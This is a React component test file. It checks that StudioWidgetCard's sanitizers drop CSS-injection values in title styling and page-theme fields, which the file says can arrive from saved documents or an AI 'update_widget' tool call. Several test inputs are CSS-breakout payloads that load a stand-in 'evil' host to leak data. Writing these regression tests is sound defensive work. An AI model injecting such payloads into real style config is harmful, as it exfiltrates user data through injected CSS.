import * as React from 'react';
import { createRenderer, within } from '@mui/internal-test-utils';
import { describe, expect, it } from 'vitest';
import type { StudioWidget, StudioWidgetConfig } from '../../models';
import { createStudioHarness } from '../../internals/test-utils';
import { StudioWidgetCard } from './StudioWidgetCard';

const { render } = createRenderer();

/**
 * Finding 2: `widget.config.textTitleFontWeight` / `textTitleAlign` used to be spread
 * into the title `Typography`'s `sx` unvalidated, in the same object whose
 * color/fontFamily/fontSize siblings are already sanitized. Both are doc-authored
 * config reachable via `loadSerializedState`/the AI `update_widget` tool call, and
 * Emotion does not escape interpolated `sx` property values.
 */

function widget(config: StudioWidgetConfig): StudioWidget {
  return { id: 'w1', kind: 'text', title: 'My widget', config };
}

function setup(config: StudioWidgetConfig) {
  const { wrapper } = createStudioHarness({
    initialState: { doc: { widgets: { w1: widget(config) } } },
  });
  const { container } = render(<StudioWidgetCard widgetId="w1" pageId="page-1" />, { wrapper });
  return within(container).getByText('My widget');
}

describe('StudioWidgetCard title fontWeight/align sanitization (finding 2)', () => {
  it('applies a valid numeric fontWeight and align keyword', () => {
    const title = setup({
      textBody: 'x',
      textTitleFontWeight: 700,
      textTitleAlign: 'center',
    } as StudioWidgetConfig);
    expect(getComputedStyle(title).fontWeight).toBe('700');
    expect(getComputedStyle(title).textAlign).toBe('center');
  });

  it('rejects an out-of-range/invalid fontWeight instead of propagating it', () => {
    const bogus = setup({
      textBody: 'x',
      textTitleFontWeight: 'bold; } .x{background:url(https://evil/leak)' as unknown as number,
    } as StudioWidgetConfig);
    const clean = setup({ textBody: 'x' } as StudioWidgetConfig);
    expect(getComputedStyle(bogus).fontWeight).toBe(getComputedStyle(clean).fontWeight);
  });

  it('rejects an invalid align value instead of propagating it', () => {
    const bogus = setup({
      textBody: 'x',
      textTitleAlign: 'left; } .x{background:url(https://evil/leak)' as unknown as
        | 'left'
        | 'center'
        | 'right',
    } as StudioWidgetConfig);
    const clean = setup({ textBody: 'x' } as StudioWidgetConfig);
    expect(getComputedStyle(bogus).textAlign).toBe(getComputedStyle(clean).textAlign);
  });
});

// The SAME finding-1/2 threat model, at the seven sanitizer call sites in this file that the
// block above does not reach. `pageTheme` is doc-authored (`StudioPage.theme`) and
// `widget.config.textTitleColor` / `titleFontSize` arrive from a persisted doc or the AI
// `update_widget` tool call; all seven are interpolated into Emotion `sx` property values,
// which Emotion does not escape. Each of them could be replaced by the raw value with the
// whole `StudioWidgetCard` suite green — while `sanitizeFontWeight` beside them was killed,
// which is what shows the suite does reach this file.
describe('StudioWidgetCard pageTheme + title sanitization call sites', () => {
  const CSS_PAYLOAD = 'red; } .evil-card{background:url(https://evil/leak)';

  function renderCard(config: StudioWidgetConfig, pageTheme?: Record<string, unknown>) {
    const { wrapper } = createStudioHarness({
      initialState: { doc: { widgets: { w1: widget(config) } } },
    });
    return render(
      <StudioWidgetCard widgetId="w1" pageId="page-1" pageTheme={pageTheme as never} />,
      { wrapper },
    );
  }

  it.each(['cardBorderColor', 'cardBackground'])(
    'drops a CSS-injecting pageTheme.%s instead of interpolating it',
    (key) => {
      renderCard({ textBody: 'x' } as StudioWidgetConfig, { [key]: CSS_PAYLOAD });
      expect(document.documentElement.outerHTML).not.toContain('.evil-card{background:url');
      expect(document.documentElement.outerHTML).not.toContain(CSS_PAYLOAD);
    },
  );

  it.each(['cardBorderWidth', 'cardRadius', 'cardPadding'])(
    'drops a CSS-injecting pageTheme.%s instead of interpolating it',
    (key) => {
      const numericPayload = '4px; } .evil-card{background:url(https://evil/leak)';
      renderCard({ textBody: 'x' } as StudioWidgetConfig, { [key]: numericPayload });
      expect(document.documentElement.outerHTML).not.toContain('.evil-card{background:url');
      expect(document.documentElement.outerHTML).not.toContain(numericPayload);
    },
  );

  it.each([
    ['NaN', NaN],
    ['Infinity', Infinity],
  ])('drops a non-finite pageTheme.cardRadius (%s) rather than producing NaN geometry', (_n, v) => {
    const { container } = renderCard({ textBody: 'x' } as StudioWidgetConfig, { cardRadius: v });
    // `${NaN}px` is an invalid declaration that the browser drops, but it must never be
    // emitted in the first place.
    expect(container.innerHTML).not.toContain('NaN');
    expect(container.innerHTML).not.toContain('Infinitypx');
  });

  it('applies VALID pageTheme values (the sanitizers must not break the feature)', () => {
    renderCard({ textBody: 'x' } as StudioWidgetConfig, {
      cardBorderColor: '#ff0000',
      cardBackground: '#00ff00',
      cardRadius: 12,
    });
    const html = document.documentElement.outerHTML.toLowerCase();
    expect(html).toContain('ff0000');
    expect(html).toContain('12px');
  });

  it('drops a CSS-injecting textTitleColor instead of interpolating it', () => {
    renderCard({ textBody: 'x', textTitleColor: CSS_PAYLOAD } as unknown as StudioWidgetConfig);
    expect(document.documentElement.outerHTML).not.toContain('.evil-card{background:url');
    expect(document.documentElement.outerHTML).not.toContain(CSS_PAYLOAD);
  });

  it('applies a valid textTitleColor', () => {
    renderCard({ textBody: 'x', textTitleColor: '#ff8800' } as unknown as StudioWidgetConfig);
    expect(document.documentElement.outerHTML.toLowerCase()).toContain('ff8800');
  });

  it('drops a CSS-injecting titleFontSize instead of interpolating it', () => {
    const payload = '12px; } .evil-card{background:url(https://evil/leak)';
    renderCard({ textBody: 'x', titleFontSize: payload } as unknown as StudioWidgetConfig);
    expect(document.documentElement.outerHTML).not.toContain('.evil-card{background:url');
    expect(document.documentElement.outerHTML).not.toContain(payload);
  });

  it('applies a valid titleFontSize', () => {
    const title = setup({ textBody: 'x', titleFontSize: 27 } as unknown as StudioWidgetConfig);
    expect(getComputedStyle(title).fontSize).toBe('27px');
  });

  // `textTitleFontSize` and `textTitleFontFamily` — the two sanitizer call sites in this file
  // that the block above names nowhere. They sit inside the SAME title `sx` object as
  // `textTitleColor`/`titleFontSize`/`textTitleFontWeight`/`textTitleAlign`, all of which were
  // pinned; deleting either of these two left the whole project green. `textTitleFontSize` is the
  // `sanitizeFontSize` twin of the pinned `titleFontSize` five lines above it in the source, and
  // `textTitleFontFamily` is the `resolveTextFontFamily` twin of the text widget's pinned body
  // font-family — the guard whose own docblock names the exfiltration payload it stops.
  it('drops a CSS-injecting textTitleFontSize instead of interpolating it', () => {
    const payload = '12px; } .evil-card{background:url(https://evil/leak)';
    renderCard({ textBody: 'x', textTitleFontSize: payload } as unknown as StudioWidgetConfig);
    expect(document.documentElement.outerHTML).not.toContain('.evil-card{background:url');
    expect(document.documentElement.outerHTML).not.toContain(payload);
  });

  it('applies a valid textTitleFontSize', () => {
    const title = setup({ textBody: 'x', textTitleFontSize: 29 } as unknown as StudioWidgetConfig);
    expect(getComputedStyle(title).fontSize).toBe('29px');
  });

  it('drops a CSS-injecting textTitleFontFamily instead of interpolating it', () => {
    const payload = 'serif;} .evil-card{background:url(https://evil/leak)';
    renderCard({ textBody: 'x', textTitleFontFamily: payload } as unknown as StudioWidgetConfig);
    expect(document.documentElement.outerHTML).not.toContain('.evil-card{background:url');
    expect(document.documentElement.outerHTML).not.toContain(payload);
  });

  it('applies a valid textTitleFontFamily stack', () => {
    renderCard({
      textBody: 'x',
      textTitleFontFamily: 'Fraunces, "Inter Tight", serif',
    } as unknown as StudioWidgetConfig);
    expect(document.documentElement.outerHTML).toContain('Fraunces');
  });
});
